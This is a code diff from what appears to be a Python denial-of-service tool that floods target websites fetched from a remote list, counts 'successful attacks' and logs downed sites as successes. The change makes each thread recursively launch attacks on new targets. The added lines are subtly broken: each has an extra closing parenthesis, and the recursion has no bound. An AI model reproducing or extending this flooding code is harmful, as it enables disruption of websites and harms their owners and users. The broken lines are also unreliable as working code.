@@ -71,7 +71,7 @@ def mainth(site: str):
          'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru', 'x-forwarded-proto': 'https',
          'Accept-Encoding': 'gzip, deflate, br'})
 
-    logger.info("STARTING ATTACK TO " + site)
+    logger.info("STARTING ATTACK ON " + site)
 
     attacks_number = 0
 
@@ -101,16 +101,17 @@ def mainth(site: str):
                 logger.info(f"ATTACKED {site}; attack count: {attacks_number}; RESPONSE CODE: {response.status_code}")
         if attacks_number > 0:
             logger.success("SUCCESSFUL ATTACKS on " + site + ": " + str(attacks_number))
-        # when thread finishes, add new task to executor
-        executor.submit(mainth, choice(remoteProvider.get_target_sites()))
+        logger.info("re-using thread for a new attack")
+        mainth(choice(remoteProvider.get_target_sites())))
     except ConnectionError as exc:
         logger.success(f"{site} is down")
-        # when thread finishes, add new task to executor
-        executor.submit(mainth, choice(remoteProvider.get_target_sites()))
+        # when thread is about to finish, just re-start its task
+        logger.info("re-using thread for a new attack")
+        mainth(choice(remoteProvider.get_target_sites())))
     except Exception as exc:
         logger.warning(f"issue happened: {exc}, SUCCESSFUL ATTACKS: {attacks_number}")
-        # when thread finishes, add new task to executor
-        executor.submit(mainth, choice(remoteProvider.get_target_sites()))
+        logger.info("re-using thread for a new attack")
+        mainth(choice(remoteProvider.get_target_sites())))
 
 def clear():
     if platform.system() == "Linux":
